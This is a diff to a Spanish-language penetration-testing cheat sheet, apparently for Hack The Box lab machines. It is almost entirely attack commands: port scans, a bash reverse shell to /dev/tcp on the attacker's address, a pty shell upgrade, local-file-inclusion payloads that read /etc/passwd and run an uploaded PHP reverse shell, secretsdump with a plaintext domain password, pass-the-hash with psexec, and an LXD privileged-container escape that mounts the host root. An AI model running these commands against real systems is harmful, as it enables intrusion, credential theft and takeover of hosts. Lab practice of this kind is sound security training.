@@ -3,6 +3,7 @@
 ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.46 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 nmap -sC -sV -p$ports 10.10.10.46
 Masscan -p 1-65535 10.10.10.30 -e tun0 –rate=1000
+nmap -sU -v 10.10.10.55
 
 ***************************************************************Cracking password**
 
@@ -24,12 +25,20 @@ Comando para obtener una shell de linux cuando se tiene una conexión con nc.
 SHELL=/bin/bash script -q /dev/null
 ó
 bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'
+ó
+python3 -c "import pty; pty.spawn('/bin/bash')"
 
 ************************************************************* Scan web*********************************
 
 Scan subdirectory
 
 gobuster dir -u http://10.10.10.29/ -w /usr/share/wordlists/dirb/common.txt
+
+revisando LFI
+http://10.10.10.55/?file=../../../../etc/passwd
+
+Si se puede subir una reverse_shell.php se puede llamar con el siguiente LFI URL
+http://10.10.10.55/?file=../../../../var/lib/tftpboot/rev.php 
 
 ************************************************************Arquitectura de sistesmas operativos***************************
 
@@ -60,3 +69,19 @@ secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
 conectarse al servidor con hashe
 psexec.py megacorp.local/administrator@10.10.10.30 -hashes <NTML hash>:<NTLM hash>
 
+************************************************************Contenedores de linux LXC***********************************
+Contienen un entorno de servicios, entre ellos contienen comandos para poder ejecutar en el sistema operativo:
+
+En la máquina atacante descargar:
+git clone  https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+./build-alpine
+
+Esto genera un archivo con el nombre alpine-v3.11-x86_64-20200505_1834.tar.gz el cual debe ser sube al remote host
+
+se crea un alias a la imagen
+lxc image import ./alpine-v3.11-x86_64-20200505_1834.tar.gz --alias rootimage
+lxc init rootimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
